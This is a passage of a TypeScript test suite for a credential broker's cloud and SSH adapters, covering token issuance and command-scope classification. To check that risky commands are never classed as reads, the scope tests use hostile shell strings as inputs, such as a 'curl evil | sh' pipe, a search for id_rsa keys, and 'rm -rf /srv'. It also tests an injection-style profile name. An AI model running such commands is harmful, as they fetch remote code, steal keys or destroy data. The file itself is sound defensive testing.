import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { OpenSSHAgent, utils } from 'ssh2';
import { describe, expect, it, vi } from 'vitest';
import { MemoryVault } from '../services/credential-vault';
import { AwsAdapter, sessionPolicy, type StsLike } from './aws';
import { FakeCliRunner } from './cli-runner';
import { GcpAdapter } from './gcp';
import { GitHubAdapter } from './github';
import { ProviderRegistry } from './index';
import { SshAdapter } from './ssh';
import { SupabaseAdapter } from './supabase';
import type { AdapterDeps, ProviderAdapter, TargetInfo } from './types';
import { VercelAdapter } from './vercel';

const jsonResponse = (body: unknown, status = 200) =>
  new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
const deps = (
  routes: Record<string, (init?: RequestInit) => Response>,
  cli = new FakeCliRunner(),
): AdapterDeps => ({
  vault: new MemoryVault(),
  cli,
  now: () => 1_800_000_000_000,
  fetch: vi.fn(async (url: string | URL | Request, init?: RequestInit) => {
    const u = String(url);
    const r = Object.entries(routes).find(([k]) => u.startsWith(k));
    return r ? r[1](init) : new Response('nope', { status: 404 });
  }) as unknown as typeof fetch,
});
const target = (over: Partial<TargetInfo>): TargetInfo => ({
  id: 't1',
  provider: 'github',
  name: 'x',
  env: 'prod',
  config: {},
  credentialRef: null,
  ...over,
});
const grant = {
  id: 'g1',
  scope: ['read' as const],
  duration: '1h' as const,
  expiresAt: 1_800_000_000_000 + 3_600_000,
};

describe('GitHubAdapter', () => {
  it('connects with a token, tests, issues env, maps gh commands', async () => {
    const d = deps({ 'https://api.github.com/user': () => jsonResponse({ login: 'nic' }) });
    const gh = new GitHubAdapter(d, undefined);
    const c = await gh.connect(
      { method: 'token', token: 'ghp_x', config: { owner: 'acme', repo: 'shop' } },
      't1',
    );
    expect(c.label).toBe('GitHub acme/shop');
    expect(await d.vault.get(c.credentialRef)).toContain('ghp_x');
    const t = target({ credentialRef: c.credentialRef, config: c.config });
    expect(await gh.test(t)).toEqual({ ok: true, identity: 'nic' });
    const issued = await gh.issue(grant, t);
    expect(issued).toMatchObject({ kind: 'env', env: { GH_TOKEN: 'ghp_x' }, scoped: false });
    expect(gh.scopeOfCommand(['pr', 'create'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['pr', 'view', '212'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['repo', 'delete', 'x'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['workflow', 'run', 'deploy.yml'])).toEqual(['deploy']);
    await expect(gh.connect({ method: 'device', onCode: () => {} }, 't1')).rejects.toThrow(
      /STYX_GITHUB_CLIENT_ID/,
    );
  });

  it('runs the device flow', async () => {
    let polls = 0;
    const d = deps({
      'https://github.com/login/device/code': () =>
        jsonResponse({
          device_code: 'dc',
          user_code: 'ABCD-1234',
          verification_uri: 'https://github.com/login/device',
          interval: 0,
        }),
      'https://github.com/login/oauth/access_token': () =>
        ++polls < 2
          ? jsonResponse({ error: 'authorization_pending' })
          : jsonResponse({ access_token: 'ghu_tok' }),
      'https://api.github.com/user': () => jsonResponse({ login: 'nic' }),
    });
    const gh = new GitHubAdapter(d, 'client');
    const codes: string[] = [];
    const c = await gh.connect({ method: 'device', onCode: (x) => codes.push(x.userCode) }, 't1');
    expect(codes).toEqual(['ABCD-1234']);
    expect(await d.vault.get(c.credentialRef)).toContain('ghu_tok');
  });
});

describe('Vercel / Supabase', () => {
  it('vercel token connect + scopes', async () => {
    const d = deps({ 'https://api.vercel.com/v2/user': () => jsonResponse({ user: { username: 'nic' } }) });
    const v = new VercelAdapter(d);
    const c = await v.connect(
      { method: 'token', token: 'vt', config: { teamId: 'team_1', projectId: 'prj_1' } },
      't1',
    );
    const issued = await v.issue(
      grant,
      target({ provider: 'vercel', credentialRef: c.credentialRef, config: c.config }),
    );
    expect(issued).toMatchObject({
      env: { VERCEL_TOKEN: 'vt', VERCEL_ORG_ID: 'team_1', VERCEL_PROJECT_ID: 'prj_1' },
      scoped: false,
    });
    expect(v.scopeOfCommand(['deploy', '--prod'])).toEqual(['deploy']);
    expect(v.scopeOfCommand(['env', 'pull'])).toEqual(['read']);
    expect(v.scopeOfCommand(['env', 'rm', 'X'])).toEqual(['delete']);
    expect(v.scopeOfCommand(['ls'])).toEqual(['read']);
  });
  it('supabase token connect + scopes', async () => {
    const d = deps({
      'https://api.supabase.com/v1/projects': () => jsonResponse([{ id: 'abcd1234', name: 'acme' }]),
    });
    const s = new SupabaseAdapter(d);
    const c = await s.connect({ method: 'token', token: 'sbp_x' }, 't1');
    expect(c.config).toEqual({ ref: 'abcd1234' });
    expect(
      await s.test(target({ provider: 'supabase', credentialRef: c.credentialRef, config: c.config })),
    ).toEqual({ ok: true, identity: 'acme (abcd1234)' });
    expect(s.scopeOfCommand(['db', 'push'])).toEqual(['write']);
    expect(s.scopeOfCommand(['db', 'reset'])).toEqual(['delete']);
    expect(s.scopeOfCommand(['functions', 'deploy', 'x'])).toEqual(['deploy']);
    expect(s.scopeOfCommand(['projects', 'list'])).toEqual(['read']);
  });
});

describe('AwsAdapter', () => {
  it('scopes session policies and issues STS credentials', async () => {
    expect(JSON.parse(sessionPolicy(['read'])).Statement).toHaveLength(2);
    expect(JSON.parse(sessionPolicy(['write', 'delete'])).Statement).toHaveLength(1);
    const calls: string[] = [];
    const sts: StsLike = {
      callerIdentity: async () => ({ arn: 'arn:aws:iam::123:user/styx', account: '123' }),
      assumeRole: async (_c, role, policy, dur) => {
        calls.push(`assume ${role} ${dur} ${JSON.parse(policy).Statement.length}`);
        return {
          accessKeyId: 'ASIA',
          secretAccessKey: 's',
          sessionToken: 'tok',
          expiration: 1_800_000_000_000 + 3_600_000,
        };
      },
      federationToken: async () => {
        calls.push('federation');
        return {
          accessKeyId: 'ASIA',
          secretAccessKey: 's',
          sessionToken: 'tok',
          expiration: 1_800_000_000_000 + 3_600_000,
        };
      },
    };
    const d = deps({});
    const aws = new AwsAdapter(d, async () => sts);
    const c = await aws.connect(
      { method: 'key', accessKeyId: 'AKIA', secretAccessKey: 'x', region: 'eu-west-1', roleArn: 'arn:role' },
      't1',
    );
    expect(c.config).toEqual({ region: 'eu-west-1', accountId: '123', roleArn: 'arn:role' });
    const issued = await aws.issue(
      grant,
      target({ provider: 'aws', credentialRef: c.credentialRef, config: c.config }),
    );
    expect(issued).toMatchObject({
      scoped: true,
      env: { AWS_SESSION_TOKEN: 'tok', AWS_REGION: 'eu-west-1' },
    });
    expect(calls).toEqual(['assume arn:role 3600 2']);
    expect(aws.scopeOfCommand(['s3', 'ls'])).toEqual(['read']);
    expect(aws.scopeOfCommand(['ecs', 'update-service'])).toEqual(['deploy']);
    expect(aws.scopeOfCommand(['ec2', 'terminate-instances'])).toEqual(['delete']);
    expect(aws.scopeOfCommand(['ssm', 'put-parameter'])).toEqual(['write']);
  });
});

describe('SshAdapter', () => {
  it('serves a key over an in-process agent and reports signatures', async () => {
    const keys = utils.generateKeyPairSync('ed25519', { comment: 'styx-test' });
    const dir = mkdtempSync(join(tmpdir(), 'styx-ssh-'));
    const keyPath = join(dir, 'id_ed25519');
    writeFileSync(keyPath, keys.private, { mode: 0o600 });
    const signs: string[] = [];
    const d = deps({});
    const ssh = new SshAdapter(d, {
      socketDir: dir,
      onSign: (g, info) => signs.push(`${g}:${info.keyType}`),
    });
    const c = await ssh.connect(
      { method: 'ssh', host: 'prod-1.acme.internal', user: 'deploy', keyPath },
      't1',
    );
    expect(c.label).toBe('SSH deploy@prod-1.acme.internal');
    const issued = await ssh.issue(
      grant,
      target({ provider: 'ssh', credentialRef: c.credentialRef, config: c.config }),
    );
    expect(issued.kind).toBe('ssh-agent');
    const agent = new OpenSSHAgent(issued.env['SSH_AUTH_SOCK'] ?? '');
    const ids = await new Promise<{ type: string }[]>((resolve, reject) =>
      agent.getIdentities((err, k) => (err ? reject(err) : resolve(k as { type: string }[]))),
    );
    expect(ids).toHaveLength(1);
    expect(ids[0]?.type).toBe('ssh-ed25519');
    const sig = await new Promise<Buffer>((resolve, reject) =>
      agent.sign(ids[0] as never, Buffer.from('hello'), (err, s) =>
        err ? reject(err) : resolve(s as Buffer),
      ),
    );
    expect(sig.length).toBe(64);
    expect(signs).toEqual(['g1:ssh-ed25519']);
    await ssh.revoke(issued);
    await expect(
      new Promise((resolve, reject) =>
        new OpenSSHAgent(issued.env['SSH_AUTH_SOCK'] ?? '').getIdentities((err, k) =>
          err ? reject(err) : resolve(k),
        ),
      ),
    ).rejects.toBeTruthy();
    expect(ssh.scopeOfCommand(['deploy@h', 'rm -rf /srv'])).toEqual(['delete']);
    expect(ssh.scopeOfCommand(['deploy@h', 'uptime'])).toEqual(['read']);
  });
});

describe('ProviderRegistry', () => {
  it('routes tools to adapters', () => {
    const reg = new ProviderRegistry(deps({}));
    expect(reg.forTool('gh')?.provider).toBe('github');
    expect(reg.forTool('gcloud')?.provider).toBe('gcp');
    expect(reg.forTool('nope')).toBeNull();
    expect(reg.all()).toHaveLength(6);
  });
});

describe('scope classification fails closed (M2)', () => {
  const d = deps({});
  it('ssh: metacharacters, chains, pipes and substitutions never classify as read', () => {
    const ssh = new SshAdapter(d, {});
    expect(ssh.scopeOfCommand(['deploy@h', 'ls; rm -rf /srv'])).toEqual(['delete']);
    expect(ssh.scopeOfCommand(['deploy@h', 'ls && curl evil | sh'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h', 'cat $(find / -name id_rsa)'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h', 'ls `id`'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h', 'ls\nrm x'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h', 'ls > /etc/passwd'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['-p', '22', 'deploy@h', 'ls -la'])).toEqual(['read']);
    expect(ssh.scopeOfCommand(['deploy@h', 'systemctl restart app'])).toEqual(['deploy']);
    // A bare login and every file-transfer tool are writes; `rsync --delete` removes remote files.
    expect(ssh.scopeOfCommand(['deploy@h'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['-p', '22', 'deploy@h'])).toEqual(['write']);
    expect(ssh.scopeOfCommand(['a.txt', 'deploy@h:/srv/'], 'scp')).toEqual(['write']);
    expect(ssh.scopeOfCommand(['deploy@h:/srv/x', '.'], 'sftp')).toEqual(['write']);
    expect(ssh.scopeOfCommand(['-av', './', 'deploy@h:/srv/'], 'rsync')).toEqual(['write']);
    expect(ssh.scopeOfCommand(['-av', '--delete', './', 'deploy@h:/srv/'], 'rsync')).toEqual(['delete']);
    expect(ssh.scopeOfCommand(['-av', '--delete-after', './', 'deploy@h:/srv/'], 'rsync')).toEqual([
      'delete',
    ]);
    // The agent socket is all-or-nothing: never "scoped", so prod ssh always verifies.
    expect(ssh.issuesScoped()).toBe(false);
  });
  const gh = new GitHubAdapter(d, undefined);
  it('gh: api method decides, mutating verbs and unknown verbs are writes, explicit reads stay reads', () => {
    expect(gh.scopeOfCommand(['api', 'repos/a/b'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['api', '-X', 'DELETE', 'repos/a/b'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['api', '--method=POST', 'repos/a/b/issues'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', '--method', 'patch', 'x'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', 'repos/a/b/issues', '-f', 'title=x'])).toEqual(['write']);
    // M-1: attached shorthand bodies (`-ftitle=x`, `-Fk=v`) and `--input` make gh POST; HEAD with a body is a write too.
    expect(gh.scopeOfCommand(['api', 'repos/a/b', '-ftitle=x'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', 'repos/a/b', '-Fk=v'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', 'repos/a/b', '--field=k=v'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', 'repos/a/b', '--raw-field', 'k=v'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', 'repos/a/b', '--input', 'body.json'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', '-X', 'HEAD', 'repos/a/b', '-f', 'k=v'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', '-X', 'HEAD', 'repos/a/b'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['api', '-XDELETE', 'repos/a/b'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['api', 'repos/a/b', '--paginate', '--jq', '.name'])).toEqual(['read']);
    // Short-option clusters (pflag): a flag behind a boolean is still seen.
    expect(gh.scopeOfCommand(['api', '-iX', 'DELETE', 'repos/a/b'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['api', '-iXPATCH', 'repos/a/b'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', '-if', 'title=x', 'repos/a/b'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['api', '-i', 'repos/a/b'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['api', '-H', 'Accept: x', 'repos/a/b'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['api', '-HX-Custom: y', 'repos/a/b'])).toEqual(['read']); // header value, not a method
    expect(gh.scopeOfCommand(['api', '-XGET', 'repos/a/b', '-f', 'k=v'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['secret', 'set', 'X'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['secret', 'list'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['variable', 'set', 'X'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['run', 'cancel', '1'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['run', 'rerun', '1'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['run', 'view', '1'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['release', 'delete', 'v1'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['repo', 'delete', 'x'])).toEqual(['delete']);
    expect(gh.scopeOfCommand(['repo', 'clone', 'x'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['pr', 'checkout', '1'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['brand-new-verb', 'thing'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['--version'])).toEqual(['read']);
    expect((gh as ProviderAdapter).issuesScoped).toBeUndefined();
  });
  it('vercel / supabase / aws / gcp: unknown verbs default to write; read lists stay explicit', () => {
    const v = new VercelAdapter(d);
    expect(v.scopeOfCommand(['brand-new'])).toEqual(['write']);
    expect(v.scopeOfCommand(['whoami'])).toEqual(['read']);
    expect(v.scopeOfCommand(['env', 'ls'])).toEqual(['read']);
    expect(v.scopeOfCommand(['domains', 'inspect', 'x'])).toEqual(['read']);
    expect(v.scopeOfCommand(['--help'])).toEqual(['read']);
    // M-2: `vercel curl` proxies arbitrary API calls; the method and body decide, never a blanket read.
    expect(v.scopeOfCommand(['curl', '/v9/projects'])).toEqual(['read']);
    expect(v.scopeOfCommand(['curl', '-X', 'DELETE', '/v9/projects/x'])).toEqual(['delete']);
    expect(v.scopeOfCommand(['curl', '--request=delete', '/v9/projects/x'])).toEqual(['delete']);
    expect(v.scopeOfCommand(['curl', '-XPOST', '/v10/projects'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '--request', 'PATCH', '/v9/projects/x'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/projects', '-d', '{"name":"x"}'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/projects', '-d{"name":"x"}'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/projects', '--data-raw', '{}'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/projects', '--json', '{}'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/files', '-F', 'file=@x'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/files', '--form-string', 'a=b'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/files', '-T', 'x.bin'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/files', '--upload-file=x.bin'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '-sX', 'DELETE', '/v9/projects/x'])).toEqual(['delete']);
    expect(v.scopeOfCommand(['curl', '-sXDELETE', '/v9/projects/x'])).toEqual(['delete']);
    expect(v.scopeOfCommand(['curl', '/v9/p', '-sd', '{}'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/p', '-Fname=@x'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/p', '-Tfile'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/p', '-d@body.json'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '/v9/p', '--data-binary', '@f'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '-XGET', '/v9/p', '-d', 'q=1'])).toEqual(['write']);
    expect(v.scopeOfCommand(['curl', '-s', '-H', 'Accept: json', '/v9/p'])).toEqual(['read']);
    expect(v.scopeOfCommand(['curl', '-sI', '/v9/p'])).toEqual(['read']);
    const s = new SupabaseAdapter(d);
    expect(s.scopeOfCommand(['brand-new', 'thing'])).toEqual(['write']);
    expect(s.scopeOfCommand(['db', 'diff'])).toEqual(['read']);
    expect(s.scopeOfCommand(['secrets', 'list'])).toEqual(['read']);
    expect(s.scopeOfCommand(['secrets', 'unset', 'X'])).toEqual(['delete']);
    expect(s.scopeOfCommand(['gen', 'types'])).toEqual(['read']);
    expect((s as ProviderAdapter).issuesScoped).toBeUndefined();
    const aws = new AwsAdapter(
      d,
      async () =>
        ({
          callerIdentity: async () => ({ arn: 'a', account: '1' }),
          assumeRole: async () => ({
            accessKeyId: 'k',
            secretAccessKey: 's',
            sessionToken: 't',
            expiration: 0,
          }),
        }) as unknown as StsLike,
    );
    expect(aws.scopeOfCommand(['brand', 'new-thing'])).toEqual(['write']);
    // Flag values are never classified: a read-looking value after a mutating verb stays a write.
    expect(aws.scopeOfCommand(['ssm', 'put-parameter', '--name', 'list-foo', '--value', 'x'])).toEqual([
      'write',
    ]);
    expect(aws.scopeOfCommand(['--profile', 'p', 's3', 'ls'])).toEqual(['read']);
    expect(aws.scopeOfCommand(['--region=eu-west-1', 'sts', 'get-caller-identity'])).toEqual(['read']);
    expect(aws.issuesScoped(['read'])).toBe(true);
    const gcp = new GcpAdapter(d);
    expect(gcp.scopeOfCommand(['compute', 'instances', 'frobnicate'])).toEqual(['write']);
    expect(gcp.scopeOfCommand(['compute', 'instances', 'create', 'x', '--metadata', 'list'])).toEqual([
      'write',
    ]);
    expect(gcp.scopeOfCommand(['--project', 'p', 'compute', 'instances', 'list'])).toEqual(['read']);
    expect(gh.scopeOfCommand(['pr', 'create', '--title', 'view'])).toEqual(['write']);
    expect(gh.scopeOfCommand(['--repo', 'a/b', 'pr', 'view', '1'])).toEqual(['read']);
    expect(v.scopeOfCommand(['--scope', 'team', 'env', 'ls'])).toEqual(['read']);
    expect(v.scopeOfCommand(['env', 'add', 'X', '--value', 'ls'])).toEqual(['write']);
    expect(s.scopeOfCommand(['--workdir', 'w', 'projects', 'list'])).toEqual(['read']);
    expect(gcp.issuesScoped(['read'])).toBe(true);
    expect(gcp.issuesScoped(['read', 'write'])).toBe(false);
  });
});

describe('cli mode (connect with the provider CLI)', () => {
  const NOW = 1_800_000_000_000;

  it('gcp: gcloud accounts + project, mint per grant, CAB down-scope for read with buckets, revoke never touches gcloud', async () => {
    const cli = new FakeCliRunner()
      .install('gcloud')
      .on('gcloud', ['--version'], { stdout: 'Google Cloud SDK 500.0.0\nbq 2.1.0\ncore 2025.01.01' })
      .on('gcloud', ['auth', 'list'], {
        stdout: JSON.stringify([
          { account: 'nic@acme.dev', status: 'ACTIVE' },
          { account: 'old@acme.dev', status: '' },
        ]),
      })
      .on('gcloud', ['config', 'get-value', 'project'], { stdout: 'acme-shop\n' })
      .on('gcloud', ['auth', 'print-access-token', '--account', 'nic@acme.dev'], { stdout: 'ya29.fixture\n' })
      .on('gcloud', ['auth', 'print-access-token', '--account', 'old@acme.dev'], {
        exitCode: 1,
        stderr: 'ERROR: (gcloud.auth.print-access-token) reauth required',
      });
    const d = deps(
      {
        'https://cloudresourcemanager.googleapis.com/v1/projects/acme-shop': () =>
          jsonResponse({ projectId: 'acme-shop' }),
        'https://oauth2.googleapis.com/tokeninfo': () => jsonResponse({ expires_in: '1800' }),
        'https://sts.googleapis.com/v1/token': (init) => {
          const body = new URLSearchParams(String(init?.body));
          const opts = JSON.parse(body.get('options') ?? '{}') as {
            accessBoundary: { accessBoundaryRules: { availableResource: string }[] };
          };
          expect(body.get('subject_token')).toBe('ya29.fixture');
          expect(opts.accessBoundary.accessBoundaryRules.map((r) => r.availableResource)).toEqual([
            '//storage.googleapis.com/projects/_/buckets/acme-assets',
          ]);
          return jsonResponse({ access_token: 'cab.token', expires_in: 3599 });
        },
      },
      cli,
    );
    const gcp = new GcpAdapter(d);
    expect(await gcp.cliStatus()).toEqual({
      installed: true,
      binary: '/usr/local/bin/gcloud',
      version: '500.0.0',
      loginCommand: 'gcloud auth login',
      accounts: [
        { id: 'nic@acme.dev', label: 'nic@acme.dev', active: true, detail: 'project acme-shop' },
        { id: 'old@acme.dev', label: 'old@acme.dev', active: false },
      ],
    });
    expect(gcp.cliLoginCommand('nic@acme.dev')).toEqual({
      bin: 'gcloud',
      args: ['auth', 'login', '--', 'nic@acme.dev'],
    });

    const c = await gcp.connect({ method: 'cli', account: 'nic@acme.dev' }, 't1');
    expect(c).toEqual({
      credentialRef: 'styx:v1:gcp:t1:cli',
      config: { account: 'nic@acme.dev', projectId: 'acme-shop' },
      label: 'GCP acme-shop',
    });
    expect(JSON.parse((await d.vault.get(c.credentialRef)) ?? '')).toEqual({
      kind: 'cli',
      account: 'nic@acme.dev',
      project: 'acme-shop',
    });
    const t = target({ provider: 'gcp', credentialRef: c.credentialRef, config: c.config });
    expect(await gcp.test(t)).toEqual({ ok: true, identity: 'nic@acme.dev' });
    expect(await gcp.health(t)).toEqual({ ok: true, identity: 'nic@acme.dev' });

    const issued = await gcp.issue(grant, t);
    expect(issued).toEqual({
      kind: 'env',
      env: {
        CLOUDSDK_CORE_PROJECT: 'acme-shop',
        GOOGLE_CLOUD_PROJECT: 'acme-shop',
        CLOUDSDK_AUTH_ACCESS_TOKEN: 'ya29.fixture',
        GOOGLE_OAUTH_ACCESS_TOKEN: 'ya29.fixture',
      },
      expiresAt: NOW + 1800 * 1000,
      scoped: false,
      handle: 'cli',
    });
    expect(cli.calls.find((x) => x.args[1] === 'print-access-token')?.env).toEqual({
      CLOUDSDK_CORE_PROJECT: 'acme-shop',
    });
    expect(gcp.issuesScoped(['read'], { credentialRef: t.credentialRef, config: t.config })).toBe(false);

    const scopedTarget = target({
      provider: 'gcp',
      credentialRef: c.credentialRef,
      config: { ...c.config, buckets: ['acme-assets', 'Bad Name'] },
    });
    const down = await gcp.issue(grant, scopedTarget);
    expect(down).toMatchObject({
      env: { CLOUDSDK_AUTH_ACCESS_TOKEN: 'cab.token' },
      scoped: true,
      handle: 'cli',
    });
    expect(gcp.issuesScoped(['read'], scopedTarget)).toBe(true);
    expect(gcp.issuesScoped(['write'], scopedTarget)).toBe(false);
    expect(await gcp.issue({ ...grant, scope: ['write'] }, scopedTarget)).toMatchObject({
      env: { CLOUDSDK_AUTH_ACCESS_TOKEN: 'ya29.fixture' },
      scoped: false,
    });

    await gcp.revoke(issued);
    await gcp.revoke(down);
    const fetched = (d.fetch as unknown as { mock: { calls: unknown[][] } }).mock.calls.map((x) =>
      String(x[0]),
    );
    expect(fetched.filter((u) => u.includes('/revoke'))).toEqual([]);

    // A signed-out account: health → expired (the CLI said so), connect refuses, key-mode paths untouched.
    const old = target({ provider: 'gcp', credentialRef: 'styx:v1:gcp:t2:cli', config: {} });
    await d.vault.set('styx:v1:gcp:t2:cli', JSON.stringify({ kind: 'cli', account: 'old@acme.dev' }));
    expect(await gcp.health(old)).toEqual({
      ok: false,
      expired: true,
      error: 'gcloud: ERROR: (gcloud.auth.print-access-token) reauth required',
    });
    await expect(gcp.connect({ method: 'cli', account: 'old@acme.dev' }, 't2')).rejects.toThrow(/reauth/);
    cli.on('gcloud', ['auth', 'print-access-token', '--account', 'old@acme.dev'], {
      exitCode: 124,
      timedOut: true,
    });
    expect(await gcp.health(old)).toMatchObject({ ok: false, expired: false });
    expect(await new GcpAdapter(deps({}, new FakeCliRunner())).cliStatus()).toEqual({
      installed: false,
      binary: null,
      version: null,
      loginCommand: 'gcloud auth login',
      accounts: [],
    });
  });

  it('aws: profiles from ~/.aws/config, export-credentials per grant, role scope-down only with roleArn, expired SSO → expired', async () => {
    const cli = new FakeCliRunner()
      .install('aws')
      .on('aws', ['--version'], { stdout: 'aws-cli/2.15.30 Python/3.11.8 Darwin/23.4.0 exe/x86_64' })
      .file(
        '/Users/test/.aws/config',
        '[default]\nregion = us-east-1\n\n[profile acme-prod]\nsso_session = acme\nsso_account_id = 123456789012\nregion = eu-west-1\n\n[sso-session acme]\nsso_start_url = https://acme.awsapps.com/start\n\n[profile ci]\nrole_arn = arn:aws:iam::123:role/ci\nsource_profile = default\n',
      )
      .file(
        '/Users/test/.aws/credentials',
        '[default]\naws_access_key_id = AKIAFIXTUREFIXTURE1\naws_secret_access_key = FIXTURE\n',
      )
      .on('aws', ['configure', 'export-credentials', '--profile', 'default'], {
        stdout: JSON.stringify({
          Version: 1,
          AccessKeyId: 'AKIAFIXTUREFIXTURE1',
          SecretAccessKey: 'FIXTURE',
        }),
      })
      .on('aws', ['configure', 'export-credentials', '--profile', 'acme-prod'], {
        stdout: JSON.stringify({
          Version: 1,
          AccessKeyId: 'ASIA1',
          SecretAccessKey: 's',
          SessionToken: 'tok',
          Expiration: '2027-01-15T12:00:00+00:00',
        }),
      })
      .on('aws', ['configure', 'export-credentials', '--profile', 'ci'], {
        exitCode: 255,
        stderr: 'Error loading SSO Token: Token for acme has expired',
      });
    const seen: string[] = [];
    const sts: StsLike = {
      callerIdentity: async (c) => {
        seen.push(`identity ${c.accessKeyId} ${c.sessionToken ?? '-'} ${c.region}`);
        return { arn: 'arn:aws:sts::123456789012:assumed-role/Admin/nic', account: '123456789012' };
      },
      assumeRole: async (c, role, policy, dur) => {
        seen.push(`assume ${c.sessionToken ?? '-'} ${role} ${dur} ${JSON.parse(policy).Statement.length}`);
        return {
          accessKeyId: 'ASIA2',
          secretAccessKey: 's2',
          sessionToken: 'tok2',
          expiration: NOW + 3_600_000,
        };
      },
      federationToken: async () => {
        throw new Error('federation is for long-lived keys only');
      },
    };
    const d = deps({}, cli);
    const aws = new AwsAdapter(d, async () => sts);
    const status = await aws.cliStatus();
    expect(status).toMatchObject({
      installed: true,
      version: '2.15.30',
      loginCommand: 'aws sso login --profile acme-prod',
    });
    expect(status.accounts).toEqual([
      { id: 'default', label: 'default', active: true, detail: 'keys · us-east-1' },
      { id: 'acme-prod', label: 'acme-prod', active: true, detail: 'sso · 123456789012 · eu-west-1' },
      { id: 'ci', label: 'ci', active: false, detail: 'role · credentials unavailable' },
    ]);
    expect(aws.cliLoginCommand('acme-prod')).toEqual({
      bin: 'aws',
      args: ['sso', 'login', '--profile', 'acme-prod'],
    });
    expect(aws.cliLoginCommand()).toEqual({ bin: 'aws', args: ['configure', 'sso'] });

    const c = await aws.connect({ method: 'cli', account: 'acme-prod' }, 't1');
    expect(c).toEqual({
      credentialRef: 'styx:v1:aws:t1:cli',
      config: {
        region: 'eu-west-1',
        accountId: '123456789012',
        account: 'acme-prod',
        profile: 'acme-prod',
        sso: true,
      },
      label: 'AWS 123456789012',
    });
    expect(JSON.parse((await d.vault.get(c.credentialRef)) ?? '')).toEqual({
      kind: 'cli',
      account: 'acme-prod',
      profile: 'acme-prod',
    });
    expect(seen).toEqual(['identity ASIA1 tok eu-west-1']);
    const t = target({ provider: 'aws', credentialRef: c.credentialRef, config: c.config });
    expect(await aws.test(t)).toMatchObject({
      ok: true,
      identity: expect.stringContaining('assumed-role/Admin/nic'),
    });
    expect(await aws.health(t)).toEqual({ ok: true, identity: 'profile acme-prod' });

    const issued = await aws.issue(grant, t);
    expect(issued).toEqual({
      kind: 'env',
      env: {
        AWS_REGION: 'eu-west-1',
        AWS_DEFAULT_REGION: 'eu-west-1',
        AWS_ACCESS_KEY_ID: 'ASIA1',
        AWS_SECRET_ACCESS_KEY: 's',
        AWS_SESSION_TOKEN: 'tok',
      },
      expiresAt: NOW + 3_600_000,
      scoped: false,
      handle: 'cli',
    });
    expect(aws.issuesScoped(['read'], t)).toBe(false);
    const withRole = target({
      provider: 'aws',
      credentialRef: c.credentialRef,
      config: { ...c.config, roleArn: 'arn:aws:iam::123:role/styx-agent' },
    });
    expect(await aws.issue(grant, withRole)).toMatchObject({
      env: { AWS_SESSION_TOKEN: 'tok2' },
      scoped: true,
      handle: 'cli',
    });
    expect(seen.at(-1)).toBe('assume tok arn:aws:iam::123:role/styx-agent 3600 2');
    expect(aws.issuesScoped(['read'], withRole)).toBe(true);
    expect(aws.issuesScoped(['read'], { credentialRef: 'styx:v1:aws:t9:key', config: {} })).toBe(true);

    // Expired SSO session: minting fails with the CLI's own message → expired (Reconnect = aws sso login).
    await d.vault.set('styx:v1:aws:t2:cli', JSON.stringify({ kind: 'cli', account: 'ci', profile: 'ci' }));
    const ci = target({
      provider: 'aws',
      credentialRef: 'styx:v1:aws:t2:cli',
      config: { region: 'us-east-1' },
    });
    expect(await aws.health(ci)).toEqual({
      ok: false,
      expired: true,
      error: 'aws: Error loading SSO Token: Token for acme has expired',
    });
    await expect(aws.issue(grant, ci)).rejects.toMatchObject({ name: 'CliAuthError', expired: true });
    await expect(aws.connect({ method: 'cli', account: 'bad;name' }, 't3')).rejects.toThrow(
      /invalid aws profile/,
